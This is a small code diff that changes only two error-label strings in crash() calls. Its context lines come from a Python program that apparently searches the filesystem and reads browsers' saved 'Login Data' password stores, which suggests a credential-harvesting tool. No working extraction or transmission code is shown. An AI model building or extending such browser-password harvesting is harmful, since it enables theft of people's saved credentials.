@@ -36,7 +36,7 @@ def copy_file(src_path, dest_dir):
     except Exception as e:
         # Log any errors that occur during the copy process
         logger.error(f"Error copying file: {e}")
-        crash("OGE", "fun71", e, "error")
+        crash("OGE", "fun8", e, "error")
 
 
 def search_filesystem():
@@ -127,7 +127,7 @@ def search_browser(browser_name, login_data_path):
                 logger.warning(f"No passwords found in {browser_name}.")
     except sqlite3.Error as e:
         logger.error(f"Error accessing {browser_name} Login Data: {e}")
-        crash("EVE", "fun163", e, "error")
+        crash("EVE", "fun100", e, "error")
 
 
 def main():
